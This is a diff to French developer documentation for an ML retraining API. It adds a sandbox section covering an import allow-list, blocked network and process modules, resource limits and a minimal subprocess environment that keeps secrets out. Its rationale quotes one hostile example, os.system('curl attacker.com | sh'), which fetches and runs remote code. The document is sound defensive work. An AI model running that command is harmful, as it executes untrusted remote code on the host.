@@ -395,12 +395,116 @@ requests.patch(
 
 L'API vérifie automatiquement que votre `train.py` :
 - A une syntaxe Python valide (`ast.parse()`)
+- N'importe que des modules autorisés (voir section suivante)
 - Référence `TRAIN_START_DATE`
 - Référence `TRAIN_END_DATE`
 - Référence `OUTPUT_MODEL_PATH`
 - Contient un appel `pickle.dump`, `joblib.dump` ou `save_model`
 
 Si la validation échoue, l'upload est rejeté avec un message d'erreur détaillé.
+
+---
+
+## Sécurité & sandbox
+
+### Pourquoi un sandbox ?
+
+Un script `train.py` syntaxiquement valide peut contenir du code malveillant :
+`os.system("curl attacker.com | sh")`, ouverture de sockets réseau, lecture de
+fichiers système. Le sandbox applique deux couches de protection complémentaires.
+
+---
+
+### Couche 1 — Liste blanche d'imports (vérifiée à l'upload)
+
+L'API parcourt l'AST du script et rejette tout `import X` ou `from X import ...`
+dont le module de premier niveau n'est pas dans la liste suivante :
+
+| Module | Utilisation typique |
+|---|---|
+| `os`, `sys`, `pathlib` | Variables d'env, chemins |
+| `json`, `csv`, `io` | Sérialisation, lecture de fichiers |
+| `pickle`, `joblib` | Sauvegarde du modèle |
+| `pandas`, `numpy` | Manipulation des données |
+| `sklearn` | Entraînement et métriques |
+| `datetime`, `time` | Filtres temporels |
+| `math`, `statistics` | Calculs numériques |
+| `collections`, `functools`, `itertools` | Utilitaires |
+| `typing`, `abc`, `enum`, `dataclasses` | Annotations de types |
+| `copy`, `re`, `warnings`, `logging` | Usage courant |
+
+**Modules bloqués** (exemples) : `subprocess`, `socket`, `requests`, `urllib`,
+`http`, `ftplib`, `ctypes`, `paramiko`, `boto3`, `multiprocessing`.
+
+```python
+# ✅ Autorisé
+import os
+import pandas as pd
+from sklearn.ensemble import RandomForestClassifier
+from datetime import datetime
+
+# ❌ Rejeté à l'upload — "Import non autorisé : 'subprocess'"
+import subprocess
+import requests
+from socket import create_connection
+import urllib.request
+```
+
+#### Ajouter un module à la liste blanche
+
+Si votre stack ML utilise `xgboost`, `lightgbm`, `torch`, etc., ouvrez une PR
+pour ajouter le module à `_ALLOWED_IMPORT_MODULES` dans `src/api/models.py`.
+
+**Ne pas** exposer cette liste via une variable d'environnement ou `docker-compose` :
+c'est un contrôle de sécurité qui doit passer par une revue de code, pas une option
+de déploiement.
+
+---
+
+### Couche 2 — Contraintes de ressources (appliquées à l'exécution)
+
+Le sous-processus qui exécute `train.py` est soumis aux limites suivantes via
+`resource.setrlimit` (Linux, `preexec_fn` post-`fork`) :
+
+| Limite | Valeur | Effet |
+|---|---|---|
+| `RLIMIT_AS` | 2 Go | Mémoire virtuelle maximale — évite un crash de l'API par OOM |
+| `RLIMIT_NOFILE` | 50 | Descripteurs de fichiers ouverts simultanément — rend difficile l'ouverture de connexions réseau en masse |
+
+Ces limites s'appliquent aux deux points d'entrée :
+- `POST /models/{name}/{version}/retrain` (endpoint manuel)
+- Scheduler APScheduler (retrain planifié)
+
+---
+
+### Environnement injecté dans le subprocess
+
+Le script ne reçoit **pas** `os.environ` complet de l'API. Seules ces clés sont
+transmises, plus les variables fonctionnelles :
+
+| Clé | Type |
+|---|---|
+| `PATH`, `HOME`, `USER`, `LANG`, `LC_ALL` | Système (liste blanche fixe) |
+| `TMPDIR`, `TEMP`, `TMP` | Système |
+| `PYTHONPATH`, `PYTHONDONTWRITEBYTECODE`, `VIRTUAL_ENV` | Python |
+| `TRAIN_START_DATE`, `TRAIN_END_DATE` | Fonctionnel (injecté par l'API) |
+| `OUTPUT_MODEL_PATH`, `MLFLOW_TRACKING_URI`, `MODEL_NAME` | Fonctionnel (injecté par l'API) |
+
+`DATABASE_URL`, `SECRET_KEY` et tous les autres secrets présents dans l'environnement
+de l'API ne sont **jamais** transmis au script.
+
+---
+
+### Implémentation (pour les contributeurs)
+
+| Élément | Fichier | Symbole |
+|---|---|---|
+| Liste blanche + validation AST | `src/api/models.py` | `_ALLOWED_IMPORT_MODULES`, `_validate_train_script()` |
+| Limites ressources — endpoint | `src/api/models.py` | `_set_subprocess_limits()` |
+| Limites ressources — scheduler | `src/tasks/retrain_scheduler.py` | `_set_subprocess_limits()` |
+| Env minimal — endpoint | `src/api/models.py` | `_safe_env_keys` |
+| Env minimal — scheduler | `src/tasks/retrain_scheduler.py` | `_SAFE_ENV_KEYS` |
+| Tests | `tests/test_retrain.py` | `TestValidateTrainScript` (17 tests) |
 
 ---
 
